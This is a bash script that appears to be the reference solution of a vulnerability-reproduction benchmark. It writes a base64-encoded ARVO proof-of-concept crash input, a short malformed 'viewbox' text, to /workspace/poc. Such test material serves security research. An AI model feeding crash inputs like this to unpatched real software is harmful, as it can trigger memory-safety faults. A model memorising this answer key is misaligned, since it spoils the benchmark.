#!/bin/bash
# Reference solution: materialize the known-good PoC (the ARVO testcase the
# fix commit 8bb46b33 addresses) at /workspace/poc — the 'oracle passes' side of
# the bidirectional validation. (Does NOT build; grading runs on the oracle's
# untouched images, so this is level-independent.)
set -euo pipefail

mkdir -p /workspace
base64 -d > /workspace/poc <<'B64'
CnZpZXdib3ggMDktMSAzMzEgM2xpbmUKMTAsMiAsMDMzRTMzMzMzMy0zMzMzRTMzM0kzMzM6
B64

echo "wrote $(wc -c < /workspace/poc) bytes to /workspace/poc"
